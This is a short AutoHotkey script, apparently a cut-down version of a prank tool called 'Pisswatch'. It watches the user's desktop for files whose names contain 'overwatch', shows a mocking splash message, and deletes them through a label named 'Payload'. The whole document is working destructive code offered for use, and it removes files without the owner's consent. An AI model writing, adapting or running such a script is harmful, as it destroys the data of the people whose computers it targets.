; For US and EU region only
; This is a trimmed down version of Pisswatch, designed to delete files only
Start:
CheckForFile:
IfExist, %A_Desktop%\*overwatch*.*
SplashTextOn, 160, 20, nope, 凸(-_-)凸
Goto, Payload
IfNotExist, %A_Desktop%\*overwatch*.*
Goto, Start
Payload:
FileDelete, %A_Desktop%\*overwatch*.*
ExitApp
ESC::ExitApp
